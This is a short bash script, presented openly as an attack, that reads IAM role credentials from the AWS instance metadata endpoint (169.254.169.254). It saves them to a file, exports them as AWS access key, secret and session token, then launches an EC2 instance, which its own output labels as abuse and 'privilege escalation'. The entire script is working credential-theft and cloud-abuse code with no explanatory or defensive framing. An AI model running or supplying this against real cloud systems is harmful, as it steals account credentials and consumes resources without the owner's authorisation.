#!/bin/bash

echo "[+] Fetching IAM credentials..."
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)

CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)

echo $CREDS > creds.json

export AWS_ACCESS_KEY_ID=$(cat creds.json | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(cat creds.json | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(cat creds.json | jq -r .Token)

echo "[+] Creating EC2 instance (abuse)..."
aws ec2 run-instances --image-id ami-123456 --instance-type t2.micro

echo "[+] Privilege escalation complete."